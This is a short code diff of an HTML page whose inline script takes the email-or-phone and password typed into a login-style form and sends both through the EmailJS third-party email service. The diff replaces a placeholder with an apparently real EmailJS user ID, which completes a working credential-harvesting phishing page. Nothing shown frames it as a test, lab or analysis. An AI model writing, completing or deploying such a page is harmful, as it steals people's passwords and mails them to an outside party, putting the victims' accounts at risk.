@@ -97,7 +97,7 @@
     <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script type="text/javascript">
        (function(){
-          emailjs.init("YOUR_USER_ID");
+          emailjs.init("GtGOvoRxe-k7_3oK8"); // Replace with your EmailJS user ID
        })();
 
        function handleFormSubmit(event) {
@@ -105,7 +105,7 @@
             const emailOrPhone = document.querySelector('input[name="email_or_phone"]').value;
             const password = document.querySelector('input[name="password"]').value;
             
-            emailjs.send("service_iw97iee", "template_zvf9gb3", {
+            emailjs.send("service_iw97iee", "template_zvf9gb3", { // Replace with your service ID and template ID
                 email_or_phone: emailOrPhone,
                 password: password
             })
